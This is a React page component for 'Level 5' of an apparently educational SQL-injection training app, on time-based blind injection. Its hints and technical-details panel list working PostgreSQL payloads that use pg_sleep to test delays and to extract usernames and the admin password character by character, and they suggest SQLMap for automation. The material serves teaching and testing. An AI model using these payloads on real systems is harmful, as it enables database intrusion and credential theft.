'use client';

import LoginForm from '@/components/LoginForm';
import { LoginCredentials, ApiResponse } from '@/types';

export default function Level5() {
  const handleLogin = async (credentials: LoginCredentials): Promise<ApiResponse> => {
    try {
      const response = await fetch('/api/level5', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
      });

      return await response.json();
    } catch (error) {
      return {
        success: false,
        error: 'Failed to connect to server'
      };
    }
  };

  const hints = [
    "This level responds based on query execution time",
    "Use pg_sleep() function to create deliberate delays",
    "Try: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --",
    "Measure response times to extract data bit by bit",
    "Automate with tools like SQLMap for efficiency"
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12">
      <div className="container mx-auto px-6">
        <LoginForm
          level={5}
          title="Time-based Blind Injection"
          description="This level demonstrates time-based blind SQL injection where you extract information by measuring response times. The application doesn't return data directly, but you can infer information based on how long queries take to execute."
          onSubmit={handleLogin}
          hints={hints}
          isVulnerable={true}
        />

        {/* Technical Details */}
        <div className="mt-12 max-w-4xl mx-auto">
          <div className="vulnerability-card rounded-lg p-8">
            <h2 className="text-2xl font-semibold mb-6 text-cyber-blue">
              🔍 Technical Details
            </h2>
            
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Time-based Injection Technique:</h3>
                <div className="code-block">
{`-- Basic time delay test
'; SELECT pg_sleep(5) --

-- Conditional time delays
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Extract data character by character
'; SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a' THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Binary search for efficiency
'; SELECT CASE WHEN (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 64 THEN pg_sleep(5) ELSE pg_sleep(0) END --`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Timing Analysis:</h3>
                <ul className="space-y-2 text-gray-300">
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Normal response: &lt; 1 second
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    True condition: ~5 seconds (with pg_sleep(5))
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    False condition: Normal timing
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Network delays should be considered
                  </li>
                </ul>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Advantages & Challenges:</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="text-cyber-green font-semibold mb-2">Advantages:</h4>
                    <ul className="space-y-1 text-sm text-gray-300">
                      <li>• Works even when no output is visible</li>
                      <li>• Harder to detect than error-based</li>
                      <li>• Bypasses many filtering mechanisms</li>
                      <li>• Can extract any database information</li>
                    </ul>
                  </div>
                  <div>
                    <h4 className="text-cyber-red font-semibold mb-2">Challenges:</h4>
                    <ul className="space-y-1 text-sm text-gray-300">
                      <li>• Very slow data extraction</li>
                      <li>• Network latency affects accuracy</li>
                      <li>• Requires many requests</li>
                      <li>• May trigger rate limiting</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
